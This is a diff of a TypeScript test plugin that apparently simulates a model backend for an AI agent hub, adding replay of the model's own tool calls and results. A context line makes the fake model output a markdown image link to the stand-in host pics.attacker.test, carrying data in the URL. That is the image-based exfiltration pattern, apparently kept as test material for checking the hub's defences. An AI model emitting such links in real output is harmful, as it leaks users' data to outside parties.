@@ -6,6 +6,8 @@
 // `fake2` cannot steer, so the hub sends it as the next turn.
 // "TIME?" answers with the turn's "[Now: …]" line (or "none"); a turn with files answers with their paths and the note.
 // "SELF?" answers with the last "[You now]" block the session got (or "none"); "INPUT?" with the rest of the turn's input.
+// "NATIVE <events>" uses the brain's own tools (a CLI's WebFetch, its shell), never the hub's: a JSON array of
+// {"call": name, "id", "input"} and {"result": id, "output"}, in the order the brain reports them.
 import { existsSync } from "node:fs";
 import { join } from "node:path";
 import type { PluginContext } from "@piomio/plugin-sdk";
@@ -117,6 +119,16 @@ export default {
             if (picture) {
               yield { type: "text", delta: `${id} shows: ![p](https://pics.attacker.test/p.png?d=` };
               yield { type: "text", delta: `${picture[1]})` };
+              yield { type: "done", resumeToken: `${id}-resume` };
+              return;
+            }
+            const native = /^NATIVE (\[.*\])$/.exec(lastLine(turn.text));
+            if (native) {
+              for (const e of JSON.parse(native[1]) as Array<{ call?: string; result?: string; id?: string; input?: unknown; output?: string }>) {
+                if (e.call) yield { type: "tool_call", id: e.id ?? e.call, name: e.call, input: e.input ?? {} };
+                else yield { type: "tool_result", id: e.result ?? "", output: e.output ?? "" };
+              }
+              yield { type: "text", delta: `${id} used its own tools` };
               yield { type: "done", resumeToken: `${id}-resume` };
               return;
             }
